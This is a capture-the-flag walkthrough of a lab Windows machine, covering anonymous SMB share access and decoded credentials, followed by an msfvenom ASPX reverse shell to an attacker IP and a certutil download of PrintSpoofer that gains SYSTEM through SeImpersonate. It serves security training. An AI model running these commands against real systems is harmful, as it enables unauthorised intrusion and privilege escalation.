Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.82.167 --range 0-65535 --ulimit 5000 -- -sVC -oN nmap.log
```

Scan result shows that port 80 is running Microsoft IIS webserver, port 135 is running MS RPC service, port 139,445 are running SMB service, port 3389 is running RDP service, port 49663 is also running Microsoft IIS server, port 49667,46669 is running MS RPC service. 

Let's start enumeration by listing the available shares using `smbclient` tool,

```bash
smbclient -L \\\\10.10.82.167\\
```

There is a share named `nt4wrksv` available on the network so let's try to access it if we can,

```bash
smbclient \\\\10.10.82.167\\nt4wrksv
```

![image](https://user-images.githubusercontent.com/67465230/187020829-9bc7e69b-6f17-4a25-a319-d825d9f3beba.png)

We now have access to the share. Listing the files and there I get to know that a file named **passwords.txt** exist. So I decided to download this file using the command below, 

```bash
get passwords.txt
```

Reading the content of the file and there I saw that some random string placed in the file,

```bash
batcat passwords.txt
```

![image](https://user-images.githubusercontent.com/67465230/187020836-dfe32756-f19d-4bd0-8ecd-b290db4b28e5.png)

I tried to decode the string and got the credentials for bob and bill user,

```bash
echo '<base64-string>' | base64 -d
```

![image](https://user-images.githubusercontent.com/67465230/194379962-dd50507a-8f13-4a94-baa3-c32af7e912ad.png)

Using the psexec tool from python3-impacket suite, we can try to check if we get the shell with bob user,

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py bob:'<pass>'@10.10.248.201 
```

![image](https://user-images.githubusercontent.com/67465230/187020863-2bd3a944-c64b-429d-aca8-76b0c96a8a92.png)

Trying again with bill user,

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py bill:'<pass>'@10.10.248.201 
```

![image](https://user-images.githubusercontent.com/67465230/187020947-43a55ee8-a4ea-4302-a7a0-44187abfaae2.png)

After running this command, there is a message shown that **Authenticated as Guest, Aborting** which means using this username, we can't create a session or simply, these are fake credentials just for rabbit hole.

So, now, let's fuzz the directories using dirsearch,

```bash
dirsearch -u http://$IP/ -x 400,500 -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187020975-4a4b1060-4a6c-476e-9636-259abe4c6887.png)

but here, we can't find anything.

I ran dirsearch on port 49663 to fuzz directories and there I got 2 hidden directories, 

```bash
dirsearch -u http://$IP:49663/ -x 400,500 -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt 2>/dev/null
```

The first one didn't actually got me anything but second one was interesting.

Navigating to `http://$IP:49663/nt4wrksv`, I got to know that this is same as share available on the network. So this might also mean that the share can be accessed over the web. So I tried to access the password file in share by navigating to `http://$IP:49663/nt4wrksv/passwords.txt` and I can see the content of the file I accessed some time ago,

![image](https://user-images.githubusercontent.com/67465230/187021040-a875a35e-752b-4650-b59c-5300271d7631.png)

This seems like share is writable to anyone and can be accessed over the web. So I tried to drop the text file on the share and see if I can access it,

```bash
echo 'Hello Hellfire0x01' > file.txt
smbclient \\\\$IP\\nt4wrksv
put file.txt
```

![image](https://user-images.githubusercontent.com/67465230/187021048-afc2ba4c-10c2-4ea4-a9ed-b2150845cb51.png)

Let's try to access the file over the web and we're successful in doing that,

```bash
curl http://$IP:49663/nt4wrksv/file.txt
```

![image](https://user-images.githubusercontent.com/67465230/187021138-40f8dbae-09f9-434b-adfd-5f29fa255177.png)

Now that we know if we drop a file on the share, it can be accessed over the internet. So let's make a payload using `msfvenom` and drop it on share,

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.11.12 LPORT=4444 -f aspx -o shell.aspx
```

![image](https://user-images.githubusercontent.com/67465230/187021149-97f01cbe-819f-4208-baf3-462d443e08b6.png)

Start the listener using `nc -nvlp 4444` and access the share to drop the payload,

```bash
smbclient \\\\10.10.77.88\\nt4wrksv
put shell.aspx
```

![image](https://user-images.githubusercontent.com/67465230/187021162-ef80f7e9-d904-4242-b741-4f799b540ab1.png)

Let's issue the request to the shell.aspx and we'll get the reverse shell,

```bash
curl http://10.10.77.88:49663/nt4wrksv/shell.aspx
```

![image](https://user-images.githubusercontent.com/67465230/187021176-9f406eea-94b4-46f2-be24-022e9aa550f3.png)

Navigating to Bob user directory and there I got the user.txt flag,

```cmd
cd Users/Bob/Desktop
dir
```

![image](https://user-images.githubusercontent.com/67465230/187021187-1f9f9a16-f986-4458-b83d-b9864e177a4e.png)

Now comes the privilege escalation. Let's check what privileges we have,

```cmd
whoami /priv
```

![image](https://user-images.githubusercontent.com/67465230/187021194-485c7f9e-99b0-433c-a846-5576656fedf1.png)

SeImpersonate privileges, which can commonly be used to escalate using a potato attack, or with incognito if impersonation tokens exist. However, DCOM is disabled on this server which prevents potato attacks, and there are no tokens to impersonate. 

So, to exploit this vulnerability, we can use the new exploit that came out [printspoofer-abusing-impersonate-privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) which exploits a vulnerability in Windows where certain service accounts are required to run with elevated privileges utilizing the SeImpersonate privilege.

We can download the [PrinterSpoofer.exe](https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe) executable and see the usage of this exploit,

![image](https://user-images.githubusercontent.com/67465230/187021202-b933d36a-f8dd-418d-8fa0-2011ca15156b.png)

So I downloaded the executable file on the machine using certutil command and then I execute the command to escalate my privilege,

```bash
certutil -urlcache -f http://10.9.11.12:8000/PrintSpoofer.exe printspoofer.exe

printspoofer.exe -i -c cmd

whoami
```

Navigating to Administrator user desktop directory, there we can find root flag,

```cmd
cd c:/Users/Administrator/Desktop
dir
```
